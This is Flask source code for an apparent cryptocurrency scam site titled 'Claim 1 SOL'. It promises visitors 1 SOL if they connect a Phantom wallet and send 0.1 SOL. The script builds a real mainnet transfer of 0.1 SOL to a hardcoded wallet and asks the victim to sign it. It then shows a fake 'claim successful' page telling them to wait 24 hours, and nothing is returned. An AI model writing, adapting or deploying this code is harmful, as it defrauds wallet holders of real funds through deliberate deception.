from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim 1 SOL</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <style>
    body {
      background-color: #000;
      color: #00ff90;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 80px;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 20px;
    }
    .btn {
      background-color: #00ff90;
      color: #000;
      padding: 15px 35px;
      font-size: 18px;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      margin-top: 30px;
      font-weight: bold;
      box-shadow: 0 0 20px #00ff90;
    }
    .btn:hover {
      background-color: #00e67a;
    }
  </style>
</head>
<body>
  <h1>🎁 Claim Your 1 SOL Reward</h1>
  <p>Connect your wallet and send 0.1 SOL to receive 1 SOL</p>
  <button class="btn" id="connect-wallet">Connect Wallet & Send</button>

  <script>
    const connectBtn = document.getElementById('connect-wallet');
    const toPubkey = "{{ wallet_address }}";

    connectBtn.addEventListener('click', async () => {
      try {
        if (!window.solana || !window.solana.isPhantom) {
          alert("Phantom Wallet not detected. Please install Phantom Wallet.");
          return;
        }

        // Connect
        const resp = await window.solana.connect();
        const sender = resp.publicKey;
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

        // Create transaction
        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: sender,
            toPubkey: new solanaWeb3.PublicKey(toPubkey),
            lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.1,
          })
        );

        transaction.feePayer = sender;
        let { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;

        // Sign and send
        const signed = await window.solana.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(txid);

        // Redirect
        window.location.href = "/claimed";
      } catch (err) {
        console.error(err);
        alert("Transaction cancelled or failed.");
      }
    });
  </script>
</body>
</html>
"""

CLAIMED_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Claimed</title>
  <style>
    body {
      background-color: #000;
      color: #00ff90;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    h1 {
      font-size: 2.2rem;
    }
    p {
      margin-top: 20px;
      font-size: 1.1rem;
      color: #aaa;
    }
    a {
      color: #00ff90;
      display: inline-block;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>✅ You've Claimed 1 SOL!</h1>
  <p>Thank you. Your claim was successful.<br />Please wait 24 hours while your reward is processed.</p>
  <a href="/">← Back to Claim Page</a>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE, wallet_address=WALLET_ADDRESS)

@app.route("/claimed")
def claimed():
    return render_template_string(CLAIMED_TEMPLATE)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
